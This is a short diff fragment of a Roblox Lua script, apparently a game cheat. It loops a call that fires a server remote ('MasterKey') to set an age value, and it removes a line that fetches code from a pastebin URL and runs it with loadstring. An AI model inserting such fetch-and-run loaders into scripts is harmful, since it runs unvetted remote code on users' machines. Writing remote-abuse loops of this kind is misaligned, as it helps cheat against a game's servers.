@@ -488,9 +488,7 @@ while true do
 			game.ReplicatedStorage:FindFirstChild('MasterKey'):FireServer('Age','Newborn')
 		end
 		task.wait()
-			else
-				    loadstring(game:HttpGet("https://pastebin.com/raw/c4vRHDfj"))()
-
+			
 	end
 		
 			
